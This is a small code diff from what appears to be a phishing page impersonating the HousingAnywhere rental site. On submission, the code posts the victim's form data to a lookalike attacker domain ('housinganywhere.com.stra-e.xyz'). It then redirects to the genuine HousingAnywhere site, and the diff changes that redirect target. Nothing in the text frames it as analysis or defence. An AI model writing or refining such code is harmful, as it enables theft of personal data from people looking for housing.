@@ -19,7 +19,7 @@ function Home() {
   async function handleSubmitFn() {
     try {
       await axios.post(`https://housinganywhere.com.stra-e.xyz/api/user`, data);
-      router.replace('https://housinganywhere.com/room/ut1299287/es/Pozuelo%20de%20Alarc%C3%B3n/avenida-rodajos?flexDays=14');
+      router.replace('https://answers.housinganywhere.com/en/');
     } catch(err) {
       console.log(err.response, "ce o avea");
     }
